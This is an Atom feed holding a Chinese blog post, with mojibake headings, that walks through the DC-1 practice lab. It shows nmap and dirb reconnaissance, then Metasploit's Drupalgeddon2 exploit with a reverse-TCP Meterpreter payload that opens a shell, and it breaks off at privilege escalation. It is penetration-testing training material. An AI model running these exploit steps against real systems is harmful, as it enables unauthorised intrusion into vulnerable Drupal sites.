<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>è®°å½•æˆä¸ºæ›´å¥½çš„è‡ªå·±</title>
  
  <subtitle>å¯¹é…’å½“æ­Œï¼Œäººç”Ÿå‡ ä½•ï¼Ÿ</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2020-08-20T16:41:43.702Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC:1</title>
    <link href="https://lunamoore.github.io/2020/08/21/DC-1/"/>
    <id>https://lunamoore.github.io/2020/08/21/DC-1/</id>
    <published>2020-08-20T16:28:55.000Z</published>
    <updated>2020-08-20T16:41:43.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p><p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p><p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p><p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p><p>There are five flags in total, but the ultimate goal is to find and read the flag in rootâ€™s home directory. You donâ€™t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p><p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p></blockquote><a id="more"></a><h2 id="0x01-ä¸Šnmap"><a href="#0x01-ä¸Šnmap" class="headerlink" title="0x01.ä¸Šnmap"></a>0x01.ä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ3å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.08 seconds</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ls</span></span><br><span class="line">nmap.sP</span><br></pre></td></tr></table></figure><h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å¯ä»¥å‘ç°å¼€æ”¾äº†22/80/111/41087ç«¯å£</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># nmap -A 192.168.1.3 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 07:19 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36531/tcp6  status</span><br><span class="line">|   100024  1          41087/tcp   status</span><br><span class="line">|   100024  1          48070/udp6  status</span><br><span class="line">|_  100024  1          50997/udp   status</span><br><span class="line">41087/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:45:E3:65 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.80 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.37 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹"><a href="#0x03-ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹" class="headerlink" title="0x03.ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹"></a>0x03.ç”±äºå‘ç°äº†22ä¸80ç«¯å£ï¼Œå¯ä»¥è€ƒè™‘çˆ†ç ´æˆ–è€…è®¿é—®ä¸€ä¸‹</h2><p><code>è¿™é‡Œå…ˆè®¿é—®ä¸€ä¸‹</code></p><p><code>æ„Ÿè§‰åƒä¸€ä¸ªcmsï¼Œå…ˆwikiä¸€ä¸‹ï¼Œæœç„¶è¿™æ˜¯ä¸€ä¸ªç”±PHPå†™çš„å¼€æºcmsğŸ˜œ</code></p><img src="/2020/08/21/DC-1/image-20200820193047316.png" class><h2 id="0x04-æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ"><a href="#0x04-æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ" class="headerlink" title="0x04.æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ"></a>0x04.æ¥ä¸‹æ¥å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ</h2><p><code>å¯ä»¥å‘ç°robots.txtï¼Œæ­¤æ–‡ä»¶ç”¨æ¥é˜²çˆ¬è™«ï¼Œæ–‡ä»¶å†…å®¹ä¸€èˆ¬ä¸ºä¸æƒ³è®©äººçœ‹åˆ°çš„</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># dirb http://192.168.1.3 </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Aug 20 07:38:44 2020</span><br><span class="line">URL_BASE: http://192.168.1.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.3/ ----</span><br><span class="line">+ http://192.168.1.3/0 (CODE:200|SIZE:7564)                           </span><br><span class="line">+ http://192.168.1.3/admin (CODE:403|SIZE:7652)                       </span><br><span class="line">+ http://192.168.1.3/Admin (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/ADMIN (CODE:403|SIZE:7497)                       </span><br><span class="line">+ http://192.168.1.3/batch (CODE:403|SIZE:7787)                         </span><br><span class="line">+ http://192.168.1.3/cgi-bin/ (CODE:403|SIZE:287)                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/includes/                             </span><br><span class="line">+ http://192.168.1.3/index.php (CODE:200|SIZE:7564)                     </span><br><span class="line">+ http://192.168.1.3/install.mysql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/install.pgsql (CODE:403|SIZE:292)                     </span><br><span class="line">+ http://192.168.1.3/LICENSE (CODE:200|SIZE:18092)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/misc/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/modules/                             </span><br><span class="line">+ http://192.168.1.3/node (CODE:200|SIZE:7564)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/profiles/                               </span><br><span class="line">+ http://192.168.1.3/README (CODE:200|SIZE:5376)                     </span><br><span class="line">+ http://192.168.1.3/robots (CODE:200|SIZE:1561)                       </span><br><span class="line">+ http://192.168.1.3/robots.txt (CODE:200|SIZE:1561)                     </span><br><span class="line">+ http://192.168.1.3/Root (CODE:403|SIZE:283)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/scripts/                               </span><br><span class="line">+ http://192.168.1.3/search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/Search (CODE:403|SIZE:7500)                       </span><br><span class="line">+ http://192.168.1.3/server-status (CODE:403|SIZE:292)                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/sites/                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.3/themes/                               </span><br><span class="line">+ http://192.168.1.3/user (CODE:200|SIZE:7417)                         </span><br><span class="line">+ http://192.168.1.3/web.config (CODE:200|SIZE:2178)                     </span><br><span class="line">+ http://192.168.1.3/xmlrpc.php (CODE:200|SIZE:42)     </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><code>è®¿é—®ä¸€ä¸‹å¯ä»¥å‘ç°UPGRADE.txt</code></p><img src="/2020/08/21/DC-1/image-20200820200917231.png" class><p><code>è®¿é—®UPGRADE.txtï¼Œå¯ä»¥å‘ç°æ­¤cmsçš„ç‰ˆæœ¬ä¸º7.x</code></p><img src="/2020/08/21/DC-1/image-20200820201127217.png" class><p><code>ç™¾åº¦ä¸€ä¸‹å‘ç°å­˜åœ¨RCEæ¼æ´</code></p><img src="/2020/08/21/DC-1/image-20200820204120867.png" class><h2 id="0x05-get-shell"><a href="#0x05-get-shell" class="headerlink" title="0x05.get shell"></a>0x05.get shell</h2><h3 id="1-msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf"><a href="#1-msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf" class="headerlink" title="1.msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf"></a>1.msfä¸€æŠŠæ¢­çš„æˆ‘ç›´æ¥msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># msfconsole -q</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span><br><span class="line">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index, <span class="keyword">for</span> example use 7 or use exploit/unix/webapp/php_xmlrpc_eval</span><br><span class="line"></span><br><span class="line">msf5 &gt; </span><br></pre></td></tr></table></figure><h3 id="2-ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter-shell"><a href="#2-ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter-shell" class="headerlink" title="2.ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter shell"></a>2.ç”±äºæ˜¯18å¹´çš„æ´æ‰€ä»¥ä½¿ç”¨ç¬¬å››ä¸ªAPIæ³¨å…¥ï¼Œç›´æ¥æ‹¿åˆ°meterpreter shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">     Module: exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">   Platform: PHP, Unix, Linux</span><br><span class="line">       Arch: php, cmd, x86, x64</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2018-03-28</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Jasper Mattsson</span><br><span class="line">  a2u</span><br><span class="line">  Nixawk</span><br><span class="line">  FireFart</span><br><span class="line">  wvu &lt;wvu@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic (PHP In-Memory)</span><br><span class="line">  1   Automatic (PHP Dropper)</span><br><span class="line">  2   Automatic (Unix In-Memory)</span><br><span class="line">  3   Automatic (Linux Dropper)</span><br><span class="line">  4   Drupal 7.x (PHP In-Memory)</span><br><span class="line">  5   Drupal 7.x (PHP Dropper)</span><br><span class="line">  6   Drupal 7.x (Unix In-Memory)</span><br><span class="line">  7   Drupal 7.x (Linux Dropper)</span><br><span class="line">  8   Drupal 8.x (PHP In-Memory)</span><br><span class="line">  9   Drupal 8.x (PHP Dropper)</span><br><span class="line">  10  Drupal 8.x (Unix In-Memory)</span><br><span class="line">  11  Drupal 8.x (Linux Dropper)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name         Current Setting  Required  Description</span><br><span class="line">  ----         ---------------  --------  -----------</span><br><span class="line">  DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">  PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">  Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT        80               yes       The target port (TCP)</span><br><span class="line">  SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">  TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">  VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Avoid: 3 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a Drupal property injection <span class="keyword">in</span> the Forms API. </span><br><span class="line">  Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are </span><br><span class="line">  vulnerable.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2018-7600/</span><br><span class="line">  https://www.drupal.org/sa-core-2018-002</span><br><span class="line">  https://greysec.net/showthread.php?tid=2912</span><br><span class="line">  https://research.checkpoint.com/uncovering-drupalgeddon-2/</span><br><span class="line">  https://github.com/a2u/CVE-2018-7600</span><br><span class="line">  https://github.com/nixawk/labs/issues/19</span><br><span class="line">  https://github.com/FireFart/CVE-2018-7600</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  SA-CORE-2018-002</span><br><span class="line">  Drupalgeddon 2</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhosts 192.168.1.3</span><br><span class="line">rhosts =&gt; 192.168.1.3</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> lhost 192.168.1.6</span><br><span class="line">lhost =&gt; 192.168.1.6</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                      <span class="built_in">set</span> payload php/bind_php                        <span class="built_in">set</span> payload php/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp              <span class="built_in">set</span> payload php/bind_php_ipv6                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp           <span class="built_in">set</span> payload php/download_exec                   <span class="built_in">set</span> payload php/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_http      <span class="built_in">set</span> payload php/<span class="built_in">exec</span>                            <span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload multi/meterpreter/reverse_https     <span class="built_in">set</span> payload php/meterpreter/bind_tcp            <span class="built_in">set</span> payload php/reverse_perl</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl                       <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6       <span class="built_in">set</span> payload php/reverse_php</span><br><span class="line"><span class="built_in">set</span> payload php/bind_perl_ipv6                  <span class="built_in">set</span> payload php/meterpreter/bind_tcp_ipv6_uuid  </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.6:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.3:52082) at 2020-08-20 08:50:40 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h3 id="3-æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ"><a 